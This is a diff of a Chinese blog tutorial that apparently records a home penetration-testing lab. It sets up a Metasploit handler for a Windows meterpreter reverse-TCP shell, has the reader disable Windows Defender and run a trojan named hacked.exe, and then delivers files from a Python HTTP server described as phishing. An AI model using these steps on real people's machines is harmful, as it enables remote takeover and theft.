@@ -27,15 +27,17 @@
 <meta property="og:description" content="前言 正常的流程就是把物理机的人骗去点一些不该点的东西  方法一——Metasploit 生成木马（Payload）+ 监听反弹 Shell 的渗透玩法）渗透思路 生成木马 $\rightarrow$ 投毒执行 $\rightarrow$ 控制权限 $\rightarrow$ 远程写文件    🚀 第一步：在 Kali 上制作 Windows 攻击木马打开 Kali 终端，利用 msfvenom">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://harden13131.github.io/9606191efed1d4bd72fd0c4823f3d7c7.png">
-<meta property="og:image" content="https://harden13131.github.io/image-3.png">
-<meta property="og:image" content="https://harden13131.github.io/image-4.png">
-<meta property="og:image" content="https://harden13131.github.io/image-5.png">
-<meta property="og:image" content="https://harden13131.github.io/image-6.png">
+<meta property="og:image" content="https://harden13131.github.io/be070c7848f435856d8e67e9ec15a603.png">
+<meta property="og:image" content="https://harden13131.github.io/17b34f79a41d1be270ee5d4306db8c85.png">
+<meta property="og:image" content="https://harden13131.github.io/71836f05b2dc721b91458822b25b5fea.png">
+<meta property="og:image" content="https://harden13131.github.io/8398e6ca155fec95b33d8a18bb7fb8ff.png">
 <meta property="og:image" content="https://harden13131.github.io/image-8.png">
 <meta property="og:image" content="https://harden13131.github.io/image-9.png">
 <meta property="og:image" content="https://harden13131.github.io/image-7.png">
+<meta property="og:image" content="https://harden13131.github.io/a512432fe9f4b4a9bae8e3d76c279a62.png">
+<meta property="og:image" content="https://harden13131.github.io/993a72e10710e326552c78b1b79b527d.png">
 <meta property="article:published_time" content="2026-07-26T01:50:46.000Z">
-<meta property="article:modified_time" content="2026-07-26T02:49:25.804Z">
+<meta property="article:modified_time" content="2026-08-01T08:11:47.309Z">
 <meta property="article:author" content="画竹子的熊猫">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -361,7 +363,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          1.7k 字
         
       </span>
     
@@ -372,7 +374,7 @@
         
         
         
-          11 分钟
+          14 分钟
         
       </span>
     
@@ -429,12 +431,12 @@
 <ol>
 <li>在 Kali 终端输入 msfconsole 打开 Metasploit 控制台。</li>
 <li>依次输入以下配置命令：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.249.129   <span class="hljs-comment"># 换成你的 Kali IP</span><br><span class="hljs-built_in">set</span> LPORT 4444<br>run<br></code></pre></td></tr></table></figure>
-<img src="/image-3.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
+<img src="/be070c7848f435856d8e67e9ec15a603.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
 </ol>
 <p>这个时候就差那个倒霉蛋点开了那个木马程序（doge）</p>
 <h3 id="🚀-第三步：在-Windows-物理机上线（投毒）"><a href="#🚀-第三步：在-Windows-物理机上线（投毒）" class="headerlink" title="🚀 第三步：在 Windows 物理机上线（投毒）"></a>🚀 第三步：在 Windows 物理机上线（投毒）</h3><ol>
 <li>把刚才在 Kali 生成的 ~&#x2F;hacked.exe 文件传到 Windows 物理机上</li>
-<li>在 Windows 上双击运行 hacked.exe。<br><code>注意</code>:因为这是未经伪装的原生木马，Windows Defender（杀毒软件）一定会拦截报警。请先临时关闭 Windows 的“实时保护”，或者把这个文件加入信任区。<br><img src="/image-4.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>呜呜呜，被注入了&amp;&amp;&amp;<br><img src="/image-5.png" srcset="/img/loading.gif" lazyload alt="alt text"><br><img src="/image-6.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
+<li>在 Windows 上双击运行 hacked.exe。<br><code>注意</code>:因为这是未经伪装的原生木马，Windows Defender（杀毒软件）一定会拦截报警。请先临时关闭 Windows 的“实时保护”，或者把这个文件加入信任区。<br><img src="/17b34f79a41d1be270ee5d4306db8c85.png" srcset="/img/loading.gif" lazyload alt="alt text"><br>呜呜呜，被注入了&amp;&amp;&amp;<br><img src="/71836f05b2dc721b91458822b25b5fea.png" srcset="/img/loading.gif" lazyload alt="alt text"><br><img src="/8398e6ca155fec95b33d8a18bb7fb8ff.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
 </ol>
 <h3 id="🎯-第四步：控制-Windows-并写入-txt-文件！"><a href="#🎯-第四步：控制-Windows-并写入-txt-文件！" class="headerlink" title="🎯 第四步：控制 Windows 并写入 .txt 文件！"></a>🎯 第四步：控制 Windows 并写入 .txt 文件！</h3><blockquote>
 <p>当 Windows 运行木马的瞬间，Kali 的 MSF 终端会立刻弹出一行绿字：</p>
@@ -452,7 +454,23 @@
 </ol>
 <hr>
 <p>这个是另一种指令来测验  嘉豪之术（<strong>DIR</strong>）<br><img src="/image-7.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
-<h2 id="第二种方法（）"><a href="#第二种方法（）" class="headerlink" title="第二种方法（）"></a>第二种方法（）</h2>
+<h2 id="第二种方法-利用-Python-搭建简易-HTTP-投毒服务器"><a href="#第二种方法-利用-Python-搭建简易-HTTP-投毒服务器" class="headerlink" title="第二种方法___利用 Python 搭建简易 HTTP 投毒服务器"></a>第二种方法___利用 Python 搭建简易 HTTP 投毒服务器</h2><h3 id="第一步：在-Kali-上准备好你要投递的文件"><a href="#第一步：在-Kali-上准备好你要投递的文件" class="headerlink" title="第一步：在 Kali 上准备好你要投递的文件"></a>第一步：在 Kali 上准备好你要投递的文件</h3><p>我们在 Kali 的 Desktop 目录下写好了一个文件 hacked.txt（或者黑客的攻击 payload、脚本等）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到你想作为 Web 根目录的文件夹</span><br><span class="hljs-built_in">cd</span> ~/Desktop<br><br><span class="hljs-comment"># 创建你的测试文件</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello! This file was downloaded from Kali HTTP Server!&quot;</span> &gt; hacked.txt<br></code></pre></td></tr></table></figure>
+<h3 id="第二步：在-Kali-端一键启动-Python-HTTP-服务"><a href="#第二步：在-Kali-端一键启动-Python-HTTP-服务" class="headerlink" title="第二步：在 Kali 端一键启动 Python HTTP 服务"></a>第二步：在 Kali 端一键启动 Python HTTP 服务</h3><blockquote>
+<p>在<strong>同一个文件夹</strong>下，敲入这行极简命令：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 8080<br></code></pre></td></tr></table></figure>
+<h3 id="第三步：在Windows端登录伪造的web"><a href="#第三步：在Windows端登录伪造的web" class="headerlink" title="第三步：在Windows端登录伪造的web"></a>第三步：在Windows端登录伪造的web</h3><ul>
+<li>Python 会立刻把这个文件夹变成一个标准的 Web 站点，监听在 8080 端口</li>
+<li>终端会显示：Serving HTTP on 0.0.0.0 port 8080 …<br><img src="/a512432fe9f4b4a9bae8e3d76c279a62.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
+<li>下载之后就可以发现显示</li>
+<li><img src="/993a72e10710e326552c78b1b79b527d.png" srcset="/img/loading.gif" lazyload alt="alt text"></li>
+</ul>
+<hr>
+<blockquote>
+<p>这正是黑客用来进行钓鱼攻击（Phishing）和钓鱼页面投毒的经典底层逻辑！<br>警惕公共WiFi!</p>
+</blockquote>
+
                 
               </div>
             
@@ -520,6 +538,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2026/07/30/BP%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/" title="BP的学习（一）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BP的学习（一）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
